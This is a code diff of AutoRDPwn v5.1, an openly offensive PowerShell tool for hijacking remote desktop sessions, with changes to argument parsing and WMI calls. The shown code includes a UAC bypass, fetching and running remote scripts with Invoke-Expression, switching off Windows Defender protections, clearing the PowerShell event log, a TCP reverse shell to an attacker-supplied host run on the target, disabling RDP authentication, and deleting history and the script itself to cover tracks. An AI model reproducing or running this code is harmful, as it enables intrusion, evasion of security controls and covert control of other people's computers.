@@ -1,12 +1,21 @@
 ﻿[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8") ; $OSVersion = [Environment]::OSVersion.Platform ; $ErrorActionPreference = "SilentlyContinue"
-$noadmin=$args[0] ; $nogui=$args[1] ; $lang=$args[2] ; $option=$args[4] ; $shadowoption=$args[6] ; $createuser=$args[8] ; $noclean=$args[9] ; if($args[1,2,3,4,5,6]){ if(!$args[7]) { Write-Host "Not enough parameters!" -ForegroundColor Red ; exit }}
-$checkpath = Get-ChildItem $pwd\resources\Scripts ; if ($? -eq $true){ $local = "True" ; $localpath = $pwd ; Get-ChildItem -Path $localpath -Recurse | Unblock-File }
-[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy() ; [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials ; $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12' ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
+$arglist = @($args)
+if ($arglist -contains '-noadmin') { $noadmin='-noadmin' }
+if ($arglist -contains '-nogui') { $nogui='-nogui' }
+if ($arglist -contains '-lang') { $lang='-lang' ; $langval = $arglist[($arglist.IndexOf('-lang'))+1] ; if(!$langval) { Write-Host "Not enough parameters!" -ForegroundColor Red ; exit }}
+if ($arglist -contains '-option') { $option='-option' ; $optionval = $arglist[($arglist.IndexOf('-option'))+1] ; if(!$optionval) { Write-Host "Not enough parameters!" -ForegroundColor Red ; exit }}
+if ($arglist -contains '-shadow') { $shadowoption='-shadow' ; $shadowval = $arglist[($arglist.IndexOf('-shadow'))+1] ; if(!$shadowval) { Write-Host "Not enough parameters!" -ForegroundColor Red ; exit }}
+if ($arglist -contains '-createuser') { $createuser='-createuser' }
+if ($arglist -contains '-noclean') { $noclean='-noclean' }
+if ($PSScriptRoot) { $localpath = $PSScriptRoot } else { $localpath = $pwd }
+$checkpath = Get-ChildItem "$localpath\resources\Scripts" ; if ($? -eq $true){ $local = "True" ; Get-ChildItem -Path $localpath -Recurse | Unblock-File }
+[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy() ; [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+try { $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12' ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols } catch { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 }
 
 if ($OSVersion -like 'Win*'){ if ($local){ Import-Module $localpath\Resources\Scripts\AutoBypass.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/AutoBypass.ps1')}
 if ($local){ Import-Module $localpath\Resources\Design\NinjaStyle.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/NinjaStyle.ps1')}
-if ($noadmin -like '-noadmin') { $null } else { if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { if ($local){ Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass Start-Process powershell -NoNewWindow -WorkingDirectory $localpath -ArgumentList $PSCommandPath $args" ; exit }
-else { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath $args" ; exit }}}
+if ($noadmin -like '-noadmin') { $null } else { if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { if ($local){ Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass Start-Process powershell -NoNewWindow -WorkingDirectory '$localpath' -ArgumentList '$PSCommandPath' $args" ; exit }
+else { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File '$PSCommandPath' $args" ; exit }}}
 
 $Host.UI.RawUI.WindowTitle = "AutoRDPwn - v5.1 - by @JoelGMSec" ; $ProgressPreference = "SilentlyContinue" ; Set-StrictMode -Off ; $LogEngineLifeCycleEvent=$false ; $LogEngineHealthEvent=$false ; $LogProviderLifeCycleEvent=$false ; $LogProviderHealthEvent=$false ; Clear-EventLog "Windows PowerShell"
 $Host.UI.RawUI.BackgroundColor = 'Black' ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $Host.PrivateData.ErrorForegroundColor = 'Red' ; $Host.PrivateData.WarningForegroundColor = 'Magenta' ; $Host.PrivateData.DebugForegroundColor = 'Yellow' ; $Host.PrivateData.VerboseForegroundColor = 'Green' ; $Host.PrivateData.ProgressForegroundColor = 'White' ; $Host.PrivateData.ProgressBackgroundColor = 'Blue'
@@ -90,7 +99,7 @@ function Remove-Exclusions {
     Set-MpPreference -SubmitSamplesConsent 1 2>&1> $null ; Set-MpPreference -MAPSReporting 2 2>&1> $null ; Set-MpPreference -DisableScriptScanning 0 2>&1> $null }
 
     $question = { Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine -ForegroundColor Gray }
-    $system = (Get-WmiObject Win32_OperatingSystem).OSArchitecture ; if(!$nogui){ 
+    if(!$nogui){ 
     $help = "The detailed guide of use can be found at the following link:"
 
     do { Show-Banner ; Show-Language ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
@@ -118,7 +127,7 @@ function Remove-Exclusions {
     if ($langui -like 'pt*') { $input = '7' ; $language = 'Portuguese' ; [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "Choose your language:` " -NoNewLine -ForegroundColor Gray ; Write-Host "7" -ForegroundColor Green }}
     else { Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }} else { continue }}} until ($input -in '1','2','3','4','5','6','7','X')}
 
-    if($lang -like '-lang') { $language=$args[3] }
+    if($lang -like '-lang') { $language=$langval }
     if($language -in 'English') { if ($local){ Import-Module .\Resources\Languages\English.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/English.ps1')}}
     if($language -in 'Spanish') { if ($local){ Import-Module .\Resources\Languages\Spanish.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/Spanish.ps1')}}
     if($language -in 'French') { if ($local){ Import-Module .\Resources\Languages\French.ps1 } else {Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/French.ps1')}}
@@ -133,7 +142,7 @@ function Remove-Exclusions {
     Add-MpPreference -ExclusionExtension ".ps1" 2>&1> $null ; Set-MpPreference -DisableIOAVProtection 1 2>&1> $null ; Set-MpPreference -SubmitSamplesConsent 0 2>&1> $null ; Set-MpPreference -MAPSReporting 0 2>&1> $null
 
     do { Show-Banner ; Show-Menu
-    $currentuser = [Environment]::username ; if($option -like '-option') { $input=$args[5] } else { Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
+    $currentuser = [Environment]::username ; if($option -like '-option') { $input=$optionval } else { Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
     $Random = New-Object System.Random ; "$txt7"-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
     $Host.UI.RawUI.ForegroundColor = 'Green' ; $input = $Host.UI.ReadLine()} ; switch ($input) {
 
@@ -263,7 +272,7 @@ function Remove-Exclusions {
         Install-PackageProvider -Name NuGet -Force 2>&1> $null ; Install-Module -Name NtObjectManager -SkipPublisherCheck -Force 2>&1> $null
         Write-Host "[+] $txt35" -ForegroundColor Blue ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Start-Sleep -milliseconds 2000 ; query session 
         do { Write-Host ; & $question ; Write-Host "$txt36" -NoNewLine -ForegroundColor Gray ; $tscon = $Host.UI.ReadLine() ; 
-        if(!$tscon){ Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 } elseif($tscon -notmatch '^[1-99]+$'){
+        if(!$tscon){ Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 } elseif($tscon -notmatch '^\d+$'){
         Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; $tscon = $null }} until ($tscon)
         Start-Sleep -milliseconds 2000 ; Start-Win32ChildProcess "tscon $tscon" 2>&1> $null ; if($? -in 'True'){ continue } else{ $tsfail = 'True' }}
         else { Write-Host "[!] $txt5" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; $input = $null ; Show-Banner ; Show-Menu }}
@@ -578,7 +587,7 @@ function Remove-Exclusions {
    $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate } ; $session = get-pssession ; Start-Sleep -milliseconds 500 } until ($session -or $i -eq 10) ; if ($session){ $attack = "true"
 
         do { $seeshadow = "see", "ver", "regarder", "siehe", "vedere", "увидеть" ; $controlshadow = "control", "controlar", "contrôle", "kontrolle", "controllo", "контроль"
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; if($sticky){ $stickyshadow = "sticky" ; $inputoption = "sticky"} elseif($shadowoption -like '-shadow') { $inputoption=$args[7] }
+        $Host.UI.RawUI.ForegroundColor = 'Green' ; if($sticky){ $stickyshadow = "sticky" ; $inputoption = "sticky"} elseif($shadowoption -like '-shadow') { $inputoption=$shadowval }
         else { if($hash){ $user = $null } ; Write-Host ; & $question ; Write-Host "$txt29" -NoNewLine -ForegroundColor Gray ; $inputoption = $Host.UI.ReadLine()}
 
         if($inputoption -in $seeshadow) { $control = "false" ; Write-Host
@@ -622,7 +631,7 @@ function Remove-Exclusions {
 
     Write-Host ; Write-Host "[+] $txt32" -ForegroundColor Blue ; $hostname = invoke-command -session $RDP[0] -scriptblock { $env:computername }
     Write-Host ; Write-Host "[i] $txt33" -NoNewLine ; Write-Host $hostname.tolower() -ForegroundColor Gray ;  if($hash){ cmdkey /add:$computer /user:AutoRDPwn /pass:AutoRDPwn 2>&1> $null }
-    $version = invoke-command -session $RDP[0] -scriptblock { (Get-WmiObject -class Win32_OperatingSystem).Caption } ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
+    $version = invoke-command -session $RDP[0] -scriptblock { (Get-CimInstance -ClassName Win32_OperatingSystem).Caption } ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
 
     if($smbshell){ invoke-command -session $RDP[0] -scriptblock { Start-Job -ScriptBlock { 
     Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PipeShell.ps1')
@@ -640,10 +649,10 @@ function Remove-Exclusions {
     New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name LogonTimeout -Value 3600 -PropertyType DWord -Force 2>&1> $null }}
 
         if($version -Like '*Server*') { Write-Host "[!] $version $txt37" -ForegroundColor Red ; if(!$sticky) { invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Green'
-        (Get-WmiObject -class Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) 2>&1> $null
+        (Get-CimInstance -ClassName Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) 2>&1> $null
         Write-Host ; Write-Host "[+] $using:txt35" -ForegroundColor Blue ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session } ; $Host.UI.RawUI.ForegroundColor = 'Green'
         do { Write-Host ; & $question ; Write-Host "$txt36" -NoNewLine -ForegroundColor Gray ; $shadow = $Host.UI.ReadLine() ; if(!$shadow){ Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }
-        elseif($shadow -notmatch '^[1-99]+$') { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; $shadow = $null }} until ($shadow)}
+        elseif($shadow -notmatch '^\d+$') { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; $shadow = $null }} until ($shadow)}
 
         if($OSVersion -like 'Unix'){ if(!$user){ rdesktop $computer -u $user } else {  rdesktop $computer -u $user -p $password }}
         if(!$nogui){ if($vncserver){ if($local){ Import-Module .\Resources\Scripts\Invoke-VNCViewer.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')}
@@ -687,9 +696,7 @@ Write-Host "--------------------------------------------------------------------
 
 if ($metasploit){ Write-Host ; Write-Host "[+] Loading Metasploit Reverse Shell.." -ForegroundColor Blue ; Write-Host ; Start-Sleep -milliseconds 2000
 Write-Host "[!] Waiting until Metasploit Reverse Shell is working.." -ForegroundColor Red ; Start-Sleep -milliseconds 2000
-$metashell = $client = New-Object System.Net.Sockets.TCPClient("$metahost",$metaport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = 
-(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = 
-([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$metashell = "`$client = New-Object System.Net.Sockets.TCPClient('$metahost',$metaport);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String );`$sendback2  = `$sendback + 'PS ' + (pwd).Path + '> ' ;`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close()"
 invoke-command -session $RDP[0] -scriptblock { Invoke-Expression $using:metashell ; Start-Sleep -milliseconds 2000 }}
 
 if ($netcat -in 'local'){ $netcatpsone = if($local){ Import-Module .\Resources\Scripts\Invoke-PowerShellTcp.ps1 } else { (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PowerShellTcp.ps1')}
@@ -731,9 +738,9 @@ if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-
 else { Write-Host ; Write-Host "[!] $txt40" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 } if($tsfail) { Write-Host ; Write-Host "[!] $txt40" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}
 
 if ($noclean -or $nogui) { $null } else { Write-Host ; Write-Host "[!] $txt75" -ForegroundColor Red ; Start-Sleep -milliseconds 2000
-if ($sticky) { $sid = (gwmi win32_process | select handle, commandline | findstr "mstsc" | findstr "admin").split("").trim()[0] ; Wait-Process -Id $sid } 
-elseif ($vncserver) { $sid = (gwmi win32_process | select handle, commandline | findstr "VNCViewer.exe" | findstr "AutoRDPwn").split("").trim()[0] ; Wait-Process -Id $sid } 
-else { $sid = (gwmi win32_process | select handle, commandline | findstr "mstsc" | findstr "shadow").split("").trim()[0] ; Wait-Process -Id $sid }
+if ($sticky) { $sid = (Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*mstsc*admin*' }).ProcessId ; Wait-Process -Id $sid } 
+elseif ($vncserver) { $sid = (Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*VNCViewer.exe*AutoRDPwn*' }).ProcessId ; Wait-Process -Id $sid } 
+else { $sid = (Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*mstsc*shadow*' }).ProcessId ; Wait-Process -Id $sid }
 if ($attack) { Start-Sleep -milliseconds 2000 ; Write-Host ; Write-Host "[+] $txt77" -ForegroundColor Blue ; Start-Sleep -milliseconds 4500 }
 if (!$local) { $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript } ; del (Get-PSReadlineOption).HistorySavePath ; Remove-Exclusions 2>&1> $null ; Set-Clipboard $null 2>&1> $null ; cmdkey /del $computer 2>&1> $null
 Write-Host ; Write-Host "[i] $txt76" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }
